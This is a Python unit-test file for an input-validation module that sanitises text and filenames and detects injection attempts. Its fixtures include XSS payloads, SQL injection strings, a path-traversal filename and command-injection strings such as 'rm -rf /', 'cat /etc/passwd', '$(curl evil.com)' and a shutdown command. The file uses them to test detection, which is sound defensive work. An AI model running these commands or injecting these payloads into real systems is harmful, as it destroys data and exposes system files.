"""
Comprehensive unit tests for agent.validation.input_validation module.
Tests input sanitization, content validation, and security checks.
"""

import pytest
from unittest.mock import patch
from agent.validation.input_validation import (
    ValidationSeverity,
    InputSanitizer,
    ContentValidator,
    EnhancedValidator
)


class TestValidationSeverity:
    """Test ValidationSeverity enum."""
    
    def test_validation_severity_values(self):
        """Test ValidationSeverity enum values."""
        assert ValidationSeverity.LOW.value == "low"
        assert ValidationSeverity.MEDIUM.value == "medium"
        assert ValidationSeverity.HIGH.value == "high"
        assert ValidationSeverity.CRITICAL.value == "critical"
    
    def test_validation_severity_enum_membership(self):
        """Test ValidationSeverity enum membership."""
        assert ValidationSeverity.LOW in ValidationSeverity
        assert ValidationSeverity.MEDIUM in ValidationSeverity
        assert ValidationSeverity.HIGH in ValidationSeverity
        assert ValidationSeverity.CRITICAL in ValidationSeverity


class TestInputSanitizer:
    """Test InputSanitizer class."""
    
    def test_sanitize_text_basic(self):
        """Test basic text sanitization."""
        sanitizer = InputSanitizer()
        text = "Hello, World!"
        result = sanitizer.sanitize_text(text)
        
        assert result == "Hello, World!"
    
    def test_sanitize_text_with_html(self):
        """Test text sanitization with HTML characters."""
        sanitizer = InputSanitizer()
        text = "Hello <script>alert('xss')</script> World!"
        result = sanitizer.sanitize_text(text)
        
        # HTML should be escaped
        assert "&lt;script&gt;" in result
        assert "&lt;/script&gt;" in result
        assert "alert(&#x27;xss&#x27;)" in result
    
    def test_sanitize_text_with_control_characters(self):
        """Test text sanitization removes control characters."""
        sanitizer = InputSanitizer()
        text = "Hello\x00World\x01Test\x02"
        result = sanitizer.sanitize_text(text)
        
        # Control characters should be removed
        assert "\x00" not in result
        assert "\x01" not in result
        assert "\x02" not in result
        assert result == "HelloWorldTest"
    
    def test_sanitize_text_preserves_whitespace(self):
        """Test text sanitization preserves valid whitespace."""
        sanitizer = InputSanitizer()
        text = "Hello\nWorld\r\nTest\t"
        result = sanitizer.sanitize_text(text)
        
        # Valid whitespace should be preserved
        assert "\n" in result
        assert "\r" in result
        assert "\t" in result
        assert "Hello\nWorld\r\nTest\t" == result
    
    def test_sanitize_text_unicode_normalization(self):
        """Test text sanitization normalizes unicode."""
        sanitizer = InputSanitizer()
        # Using combining characters that should be normalized
        text = "café"  # e + combining acute accent
        result = sanitizer.sanitize_text(text)
        
        # Should be normalized to composed form
        assert isinstance(result, str)
        assert "café" in result or "cafe" in result
    
    def test_sanitize_text_max_length_truncation(self):
        """Test text sanitization truncates long text."""
        sanitizer = InputSanitizer()
        text = "a" * 1000
        result = sanitizer.sanitize_text(text, max_length=100)
        
        assert len(result) == 100
        assert result == "a" * 100
    
    def test_sanitize_text_strips_whitespace(self):
        """Test text sanitization strips leading/trailing whitespace."""
        sanitizer = InputSanitizer()
        text = "   Hello World   "
        result = sanitizer.sanitize_text(text)
        
        assert result == "Hello World"
    
    def test_sanitize_text_invalid_input(self):
        """Test text sanitization with invalid input type."""
        sanitizer = InputSanitizer()
        
        with pytest.raises(ValueError, match="Input must be a string"):
            sanitizer.sanitize_text(123)
        
        with pytest.raises(ValueError, match="Input must be a string"):
            sanitizer.sanitize_text(None)
        
        with pytest.raises(ValueError, match="Input must be a string"):
            sanitizer.sanitize_text([])
    
    def test_sanitize_filename_basic(self):
        """Test basic filename sanitization."""
        sanitizer = InputSanitizer()
        filename = "document.txt"
        result = sanitizer.sanitize_filename(filename)
        
        assert result == "document.txt"
    
    def test_sanitize_filename_dangerous_characters(self):
        """Test filename sanitization removes dangerous characters."""
        sanitizer = InputSanitizer()
        filename = "doc<>:\"/\\|?*ument.txt"
        result = sanitizer.sanitize_filename(filename)
        
        # Dangerous characters should be replaced with underscores
        assert result == "doc_________ument.txt"
    
    def test_sanitize_filename_path_separators(self):
        """Test filename sanitization removes path separators."""
        sanitizer = InputSanitizer()
        filename = "../../../etc/passwd"
        result = sanitizer.sanitize_filename(filename)
        
        assert ".." not in result
        assert "/" not in result
        assert result == "______etc_passwd"
    
    def test_sanitize_filename_control_characters(self):
        """Test filename sanitization removes control characters."""
        sanitizer = InputSanitizer()
        filename = "document\x00\x01.txt"
        result = sanitizer.sanitize_filename(filename)
        
        assert "\x00" not in result
        assert "\x01" not in result
        assert result == "document__.txt"
    
    def test_sanitize_filename_dots_and_spaces(self):
        """Test filename sanitization handles dots and spaces."""
        sanitizer = InputSanitizer()
        filename = "  ..document..  "
        result = sanitizer.sanitize_filename(filename)
        
        # Leading/trailing dots and spaces should be removed
        assert result == "document"
    
    def test_sanitize_filename_length_limit(self):
        """Test filename sanitization limits length."""
        sanitizer = InputSanitizer()
        filename = "a" * 300 + ".txt"
        result = sanitizer.sanitize_filename(filename)
        
        assert len(result) <= 255
        assert result.endswith(".txt")
    
    def test_sanitize_filename_empty_result(self):
        """Test filename sanitization handles empty result."""
        sanitizer = InputSanitizer()
        filename = "..."
        result = sanitizer.sanitize_filename(filename)
        
        assert result == "untitled"
    
    def test_sanitize_filename_invalid_input(self):
        """Test filename sanitization with invalid input."""
        sanitizer = InputSanitizer()
        
        with pytest.raises(ValueError, match="Filename must be a string"):
            sanitizer.sanitize_filename(123)
    
    def test_validate_email_valid(self):
        """Test email validation with valid emails."""
        sanitizer = InputSanitizer()
        
        valid_emails = [
            "user@example.com",
            "test.email@domain.org",
            "user+tag@example.co.uk",
            "firstname.lastname@company.com"
        ]
        
        for email in valid_emails:
            assert sanitizer.validate_email(email) is True
    
    def test_validate_email_invalid(self):
        """Test email validation with invalid emails."""
        sanitizer = InputSanitizer()
        
        invalid_emails = [
            "invalid-email",
            "@example.com",
            "user@",
            "user.example.com",
            "user@.com",
            "user@example.",
            "",
            123,
            None
        ]
        
        for email in invalid_emails:
            assert sanitizer.validate_email(email) is False
    
    def test_validate_url_valid(self):
        """Test URL validation with valid URLs."""
        sanitizer = InputSanitizer()
        
        valid_urls = [
            "https://example.com",
            "http://localhost:8080",
            "https://api.example.com/v1/data",
            "http://subdomain.example.org/path?param=value"
        ]
        
        for url in valid_urls:
            assert sanitizer.validate_url(url) is True
    
    def test_validate_url_invalid(self):
        """Test URL validation with invalid URLs."""
        sanitizer = InputSanitizer()
        
        invalid_urls = [
            "ftp://example.com",  # Not http/https
            "example.com",        # Missing protocol
            "http://",            # Incomplete
            "https://",           # Incomplete
            "",
            123,
            None
        ]
        
        for url in invalid_urls:
            assert sanitizer.validate_url(url) is False


class TestContentValidator:
    """Test ContentValidator class."""
    
    def test_validate_content_length_valid(self):
        """Test content length validation with valid content."""
        validator = ContentValidator()
        content = "This is a valid content with appropriate length."
        result = validator.validate_content_length(content, min_length=10, max_length=100)
        
        assert result["valid"] is True
        assert result["length"] == len(content.strip())
        assert result["severity"] == ValidationSeverity.LOW.value
    
    def test_validate_content_length_too_short(self):
        """Test content length validation with too short content."""
        validator = ContentValidator()
        content = "Short"
        result = validator.validate_content_length(content, min_length=10, max_length=100)
        
        assert result["valid"] is False
        assert "too short" in result["error"]
        assert result["severity"] == ValidationSeverity.HIGH.value
        assert result["actual_length"] == len(content.strip())
    
    def test_validate_content_length_too_long(self):
        """Test content length validation with too long content."""
        validator = ContentValidator()
        content = "a" * 150
        result = validator.validate_content_length(content, min_length=10, max_length=100)
        
        assert result["valid"] is False
        assert "too long" in result["error"]
        assert result["severity"] == ValidationSeverity.HIGH.value
        assert result["actual_length"] == 150
    
    def test_validate_content_length_invalid_type(self):
        """Test content length validation with invalid input type."""
        validator = ContentValidator()
        result = validator.validate_content_length(123, min_length=10, max_length=100)
        
        assert result["valid"] is False
        assert "must be a string" in result["error"]
        assert result["severity"] == ValidationSeverity.CRITICAL.value
    
    def test_validate_content_quality_good_content(self):
        """Test content quality validation with good content."""
        validator = ContentValidator()
        content = "This is a well-written piece of content. It has multiple sentences with varied length. The content flows naturally and maintains good quality throughout."
        result = validator.validate_content_quality(content)
        
        assert result["valid"] is True
        assert result["quality_score"] >= 0.5
        assert result["word_count"] > 0
        assert result["sentence_count"] > 0
        assert len(result["issues"]) == 0
    
    def test_validate_content_quality_repetitive_characters(self):
        """Test content quality validation with repetitive characters."""
        validator = ContentValidator()
        content = "This content has toooooooooooooooo many repeated characters."
        result = validator.validate_content_quality(content)
        
        assert result["quality_score"] < 1.0
        assert "Excessive character repetition" in result["issues"]
    
    def test_validate_content_quality_repetitive_words(self):
        """Test content quality validation with repetitive words."""
        validator = ContentValidator()
        # Create content where one word appears more than 30% of the time
        content = "test " * 10 + "word " * 2
        result = validator.validate_content_quality(content)
        
        assert result["quality_score"] < 1.0
        assert "Excessive word repetition" in result["issues"]
    
    def test_validate_content_quality_short_sentences(self):
        """Test content quality validation with very short sentences."""
        validator = ContentValidator()
        content = "Short. Very. Bad. Text. Here."
        result = validator.validate_content_quality(content)
        
        assert result["quality_score"] < 1.0
        assert "Very short sentences" in result["issues"]
    
    def test_validate_content_quality_long_sentences(self):
        """Test content quality validation with very long sentences."""
        validator = ContentValidator()
        # Create a very long sentence
        long_sentence = "This is a very long sentence with many words " * 20 + "."
        content = long_sentence + " Another sentence."
        result = validator.validate_content_quality(content)
        
        assert result["quality_score"] < 1.0
        assert "Very long sentences" in result["issues"]
    
    def test_validate_content_quality_invalid_type(self):
        """Test content quality validation with invalid input type."""
        validator = ContentValidator()
        result = validator.validate_content_quality(123)
        
        assert result["valid"] is False
        assert "must be a string" in result["error"]
        assert result["quality_score"] == 0.0
    
    def test_detect_potential_injection_safe_content(self):
        """Test injection detection with safe content."""
        validator = ContentValidator()
        content = "This is a perfectly safe piece of content with no malicious patterns."
        result = validator.detect_potential_injection(content)
        
        assert result["safe"] is True
        assert len(result["threats_detected"]) == 0
        assert result["severity"] == ValidationSeverity.LOW.value
    
    def test_detect_potential_injection_sql_injection(self):
        """Test injection detection with SQL injection patterns."""
        validator = ContentValidator()
        
        sql_injection_patterns = [
            "SELECT * FROM users WHERE id = 1",
            "DROP TABLE users",
            "1' OR '1'='1",
            "UNION SELECT password FROM users",
            "INSERT INTO users VALUES ('admin', 'password')"
        ]
        
        for pattern in sql_injection_patterns:
            result = validator.detect_potential_injection(pattern)
            assert result["safe"] is False
            assert "Potential SQL injection" in result["threats_detected"]
            assert result["severity"] == ValidationSeverity.HIGH.value
    
    def test_detect_potential_injection_xss_patterns(self):
        """Test injection detection with XSS patterns."""
        validator = ContentValidator()
        
        xss_patterns = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img onerror='alert(1)' src='x'>",
            "<iframe src='javascript:alert(1)'></iframe>",
            "<object data='javascript:alert(1)'></object>"
        ]
        
        for pattern in xss_patterns:
            result = validator.detect_potential_injection(pattern)
            assert result["safe"] is False
            assert "Potential XSS attack" in result["threats_detected"]
            assert result["severity"] == ValidationSeverity.HIGH.value
    
    def test_detect_potential_injection_command_injection(self):
        """Test injection detection with command injection patterns."""
        validator = ContentValidator()
        
        cmd_injection_patterns = [
            "rm -rf /",
            "cat /etc/passwd",
            "$(curl evil.com)",
            "`rm file.txt`",
            "; shutdown -h now"
        ]
        
        for pattern in cmd_injection_patterns:
            result = validator.detect_potential_injection(pattern)
            assert result["safe"] is False
            assert "Potential command injection" in result["threats_detected"]
            assert result["severity"] == ValidationSeverity.CRITICAL.value
    
    def test_detect_potential_injection_invalid_type(self):
        """Test injection detection with invalid input type."""
        validator = ContentValidator()
        result = validator.detect_potential_injection(123)
        
        assert result["safe"] is True
        assert len(result["threats_detected"]) == 0
        assert result["severity"] == ValidationSeverity.LOW.value


class TestEnhancedValidator:
    """Test EnhancedValidator class."""
    
    def test_enhanced_validator_initialization(self):
        """Test EnhancedValidator initialization."""
        validator = EnhancedValidator()
        
        assert isinstance(validator.sanitizer, InputSanitizer)
        assert isinstance(validator.content_validator, ContentValidator)
        assert isinstance(validator.validation_history, list)
        assert len(validator.validation_history) == 0
    
    def test_validate_input_string_basic(self):
        """Test enhanced validator with basic string input."""
        validator = EnhancedValidator()
        
        data = "Hello, World!"
        rules = {"type": str, "min_length": 5, "max_length": 50}
        result = validator.validate_input(data, rules)
        
        assert result["valid"] is True
        assert len(result["errors"]) == 0
        assert result["sanitized_data"] == "Hello, World!"
        assert "validation_id" in result
    
    def test_validate_input_string_with_sanitization(self):
        """Test enhanced validator with string sanitization."""
        validator = EnhancedValidator()
        
        data = "  Hello <script>alert('xss')</script> World!  "
        rules = {"type": str, "sanitize": True, "check_security": True}
        result = validator.validate_input(data, rules)
        
        # Should be sanitized
        assert "&lt;script&gt;" in result["sanitized_data"]
        assert result["sanitized_data"].strip() == result["sanitized_data"]
    
    def test_validate_input_string_security_violation(self):
        """Test enhanced validator with security violation."""
        validator = EnhancedValidator()
        
        data = "DROP TABLE users; --"
        rules = {"type": str, "check_security": True}
        result = validator.validate_input(data, rules)
        
        assert result["valid"] is False
        assert len(result["errors"]) > 0
        assert any("injection" in error.lower() for error in result["errors"])
    
    def test_validate_input_string_quality_check(self):
        """Test enhanced validator with quality check."""
        validator = EnhancedValidator()
        
        data = "short. bad. text."
        rules = {"type": str, "check_quality": True}
        result = validator.validate_input(data, rules)
        
        # May have warnings about quality
        assert "warnings" in result
    
    def test_validate_input_numeric_valid(self):
        """Test enhanced validator with valid numeric input."""
        validator = EnhancedValidator()
        
        data = 42
        rules = {"type": int, "min_value": 0, "max_value": 100}
        result = validator.validate_input(data, rules)
        
        assert result["valid"] is True
        assert result["sanitized_data"] == 42
    
    def test_validate_input_numeric_out_of_range(self):
        """Test enhanced validator with numeric input out of range."""
        validator = EnhancedValidator()
        
        data = 150
        rules = {"type": int, "min_value": 0, "max_value": 100}
        result = validator.validate_input(data, rules)
        
        # Should handle numeric validation (implementation-specific)
        assert "validation_id" in result
    
    def test_validate_input_list_basic(self):
        """Test enhanced validator with list input."""
        validator = EnhancedValidator()
        
        data = ["item1", "item2", "item3"]
        rules = {"type": list, "min_length": 1, "max_length": 10}
        result = validator.validate_input(data, rules)
        
        assert result["valid"] is True
        assert result["sanitized_data"] == data
    
    def test_validate_input_dict_basic(self):
        """Test enhanced validator with dictionary input."""
        validator = EnhancedValidator()
        
        data = {"key1": "value1", "key2": "value2"}
        rules = {"type": dict, "required_keys": ["key1"]}
        result = validator.validate_input(data, rules)
        
        assert result["valid"] is True
        assert result["sanitized_data"] == data
    
    def test_validate_input_type_mismatch(self):
        """Test enhanced validator with type mismatch."""
        validator = EnhancedValidator()
        
        data = "string"
        rules = {"type": int}
        result = validator.validate_input(data, rules)
        
        assert result["valid"] is False
        assert len(result["errors"]) > 0
        assert "Expected int, got str" in result["errors"][0]
    
    def test_validate_input_exception_handling(self):
        """Test enhanced validator exception handling."""
        validator = EnhancedValidator()
        
        # Create a scenario that might cause an exception
        data = "test"
        rules = {"type": str, "min_length": "invalid"}  # Invalid rule
        
        with patch('agent.validation.input_validation.logger') as mock_logger:
            result = validator.validate_input(data, rules)
            
            # Should handle the exception gracefully
            assert result["valid"] is False
            assert len(result["errors"]) > 0
            assert "Validation failed" in result["errors"][0]
    
    def test_validation_history_tracking(self):
        """Test that validation history is properly tracked."""
        validator = EnhancedValidator()
        
        # Perform multiple validations
        data1 = "test1"
        rules1 = {"type": str}
        result1 = validator.validate_input(data1, rules1)
        
        data2 = "test2"
        rules2 = {"type": str}
        result2 = validator.validate_input(data2, rules2)
        
        # Check history tracking
        assert len(validator.validation_history) == 2
        assert result1["validation_id"] == 0
        assert result2["validation_id"] == 1
    
    def test_validate_input_no_sanitization(self):
        """Test enhanced validator with sanitization disabled."""
        validator = EnhancedValidator()
        
        data = "  <script>alert('xss')</script>  "
        rules = {"type": str, "sanitize": False}
        result = validator.validate_input(data, rules)
        
        # Should not sanitize when disabled
        assert result["sanitized_data"] == data
    
    def test_validate_input_no_quality_check(self):
        """Test enhanced validator with quality check disabled."""
        validator = EnhancedValidator()
        
        data = "bad. quality. text."
        rules = {"type": str, "check_quality": False}
        result = validator.validate_input(data, rules)
        
        # Should not perform quality checks when disabled
        assert result["valid"] is True
    
    def test_validate_input_no_security_check(self):
        """Test enhanced validator with security check disabled."""
        validator = EnhancedValidator()
        
        data = "DROP TABLE users;"
        rules = {"type": str, "check_security": False}
        result = validator.validate_input(data, rules)
        
        # Should not perform security checks when disabled
        assert result["valid"] is True


class TestComplexValidationScenarios:
    """Test complex validation scenarios."""
    
    def test_novel_content_validation(self):
        """Test validation scenario for novel content."""
        validator = EnhancedValidator()
        
        novel_content = """
        Chapter 1: The Beginning
        
        Alice walked through the mysterious forest, her heart pounding with excitement.
        The trees whispered secrets in the wind, and shadows danced around her feet.
        She had never felt so alive, yet so afraid at the same time.
        """
        
        rules = {
            "type": str,
            "min_length": 50,
            "max_length": 10000,
            "sanitize": True,
            "check_quality": True,
            "check_security": True
        }
        
        result = validator.validate_input(novel_content, rules)
        
        assert result["valid"] is True
        assert len(result["errors"]) == 0
        assert len(result["warnings"]) == 0  # Good quality content
    
    def test_character_dialogue_validation(self):
        """Test validation scenario for character dialogue."""
        validator = EnhancedValidator()
        
        dialogue = '"Hello there," said Alice with a smile. "How are you today?"'
        
        rules = {
            "type": str,
            "min_length": 10,
            "max_length": 1000,
            "sanitize": True,
            "check_quality": True
        }
        
        result = validator.validate_input(dialogue, rules)
        
        assert result["valid"] is True
        assert '"Hello there,"' in result["sanitized_data"]
    
    def test_user_input_validation_with_malicious_content(self):
        """Test validation scenario for potentially malicious user input."""
        validator = EnhancedValidator()
        
        malicious_input = """
        <script>
        fetch('/api/delete-all-novels', {method: 'DELETE'});
        alert('Your novels have been deleted!');
        </script>
        """
        
        rules = {
            "type": str,
            "sanitize": True,
            "check_security": True
        }
        
        result = validator.validate_input(malicious_input, rules)
        
        # Should detect XSS attempt
        assert result["valid"] is False
        assert any("XSS" in error for error in result["errors"])
    
    def test_api_parameter_validation(self):
        """Test validation scenario for API parameters."""
        validator = EnhancedValidator()
        
        api_params = {
            "novel_id": "novel_123",
            "chapter_number": 5,
            "content_type": "narrative",
            "max_tokens": 2000
        }
        
        rules = {"type": dict}
        result = validator.validate_input(api_params, rules)
        
        assert result["valid"] is True
        assert result["sanitized_data"] == api_params
    
    def test_bulk_validation_performance(self):
        """Test validation performance with bulk data."""
        validator = EnhancedValidator()
        
        # Simulate bulk validation
        test_data = [
            ("Content 1", {"type": str, "max_length": 100}),
            ("Content 2", {"type": str, "max_length": 100}),
            ("Content 3", {"type": str, "max_length": 100}),
        ]
        
        results = []
        for data, rules in test_data:
            result = validator.validate_input(data, rules)
            results.append(result)
        
        # All should be valid
        assert all(result["valid"] for result in results)
        
        # History should track all validations
        assert len(validator.validation_history) == 3